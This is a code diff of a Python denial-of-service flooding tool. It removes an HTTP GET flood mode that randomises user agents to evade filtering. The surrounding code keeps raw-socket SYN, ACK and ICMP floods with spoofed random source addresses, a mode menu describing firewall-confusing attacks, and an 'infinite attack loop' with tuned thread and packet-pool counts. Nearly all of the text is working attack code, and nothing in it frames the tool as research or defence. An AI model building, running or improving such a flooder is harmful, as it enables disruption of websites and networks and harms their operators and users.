@@ -215,48 +215,7 @@ def _build_pool(mode_key: str, target_ip: str, target_port: int, size: int) -> l
         pool.append(_build_packet(mode_key, _rand_ip(), target_ip, _rand_port(), target_port))
     return pool
 
-def _http_sender(target_ip: str, target_port: int, stats: Stats):
-    """Layer 7 HTTP flood — opens real TCP connections and sends GET requests."""
-    # Pre-craft HTTP requests with randomized User-Agent / path to avoid trivial filtering
-    agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    ]
-    paths = ["/", "/index.html", "/api", "/login", "/home", "/search"]
-
-    while not stop_event.is_set():
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(4.0)
-            s.connect((target_ip, target_port))
-            req = (
-                f"GET {random.choice(paths)} HTTP/1.1\r\n"
-                f"Host: {target_ip}\r\n"
-                f"User-Agent: {random.choice(agents)}\r\n"
-                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-                f"Accept-Language: en-US,en;q=0.5\r\n"
-                f"Connection: keep-alive\r\n\r\n"
-            ).encode()
-            s.sendall(req)
-            stats.add_sent(1)
-            # Try to read a tiny response to confirm reply
-            try:
-                data = s.recv(1024)
-                if data:
-                    stats.add_reply("HTTP 200/OK")
-            except socket.timeout:
-                pass
-            s.close()
-        except Exception:
-            stats.add_error()
-            time.sleep(0.001)
-
 def _sender(target_ip: str, target_port: int, mode_key: str, stats: Stats):
-    if mode_key == "HTTP":
-        _http_sender(target_ip, target_port, stats)
-        return
-
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
@@ -314,9 +273,6 @@ def _sender(target_ip: str, target_port: int, mode_key: str, stats: Stats):
 # ══════════════════════════════════════════════════════════════════
 
 def _listener(target_ip: str, target_port: int, mode_key: str, stats: Stats):
-    if mode_key == "HTTP":
-        return  # HTTP mode already counts replies inside _http_sender
-
     try:
         if mode_key in ("SYN", "ACK"):
             proto = socket.IPPROTO_TCP
@@ -324,16 +280,12 @@ def _listener(target_ip: str, target_port: int, mode_key: str, stats: Stats):
             proto = socket.IPPROTO_ICMP
 
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
-        sock.settimeout(0.3)
+        sock.settimeout(0.5)
 
         while not stop_event.is_set():
             try:
                 pkt, addr = sock.recvfrom(65535)
-
-                # For CDN/WAF the reply may come from a different edge IP than the resolved A-record.
-                # Accept any reply — we filter by destination port instead.
-                # Skip localhost noise if we can identify it.
-                if addr[0] == "127.0.0.1":
+                if addr[0] != target_ip:
                     continue
 
                 if proto == socket.IPPROTO_TCP:
@@ -342,25 +294,22 @@ def _listener(target_ip: str, target_port: int, mode_key: str, stats: Stats):
                     if len(pkt) < ip_ihl + 20:
                         continue
                     tcph = struct.unpack('!HHIIBBHHH', pkt[ip_ihl:ip_ihl+20])
-                    flags = tcph[5]
-                    # We sent TO target_port, so reply comes FROM target_port.
                     src_port = tcph[0]
                     if src_port != target_port:
                         continue
+                    flags = tcph[5]
                     flag_str = _decode_tcp_flags(flags)
                     stats.add_reply(flag_str)
 
                 elif proto == socket.IPPROTO_ICMP:
+                    # ICMP echo reply type=0 or unreachable type=3
                     if len(pkt) < 21:
                         continue
-                    ip_ihl = (pkt[0] & 0x0f) * 4
-                    icmp_type = pkt[ip_ihl]
+                    icmp_type = pkt[20]
                     if icmp_type == 0:
                         stats.add_reply("ECHO REPLY")
                     elif icmp_type == 3:
                         stats.add_reply("PORT UNREACH")
-                    elif icmp_type == 11:
-                        stats.add_reply("TTL EXCEED")
 
             except socket.timeout:
                 continue
@@ -631,9 +580,6 @@ MODES = {
     "4": {"label": "ACK Flood",  "key": "ACK",  "color": "bright_magenta",
           "desc":  "Fake TCP acknowledgements — confuses stateful firewalls",
           "example": "Like replying 'I got it' to thousands of messages nobody sent"},
-    "5": {"label": "HTTP Flood", "key": "HTTP", "color": "bright_green",
-          "desc":  "Layer 7 — opens real TCP connections and sends HTTP GET requests (best vs websites)",
-          "example": "Like reloading a webpage thousands of times per second"},
 }
 
 def show_mode_menu():
@@ -660,7 +606,7 @@ def resolve(target: str) -> str:
 # RUN — INFINITE ATTACK LOOP
 # ══════════════════════════════════════════════════════════════════
 
-N_THREADS    = 64    # sender threads
+N_THREADS    = 24    # sender threads
 POOL_SIZE    = 1000  # pre-built packets per thread (eliminates per-send struct overhead)
 BATCH_REPORT = 500   # how often each thread reports to Stats
 
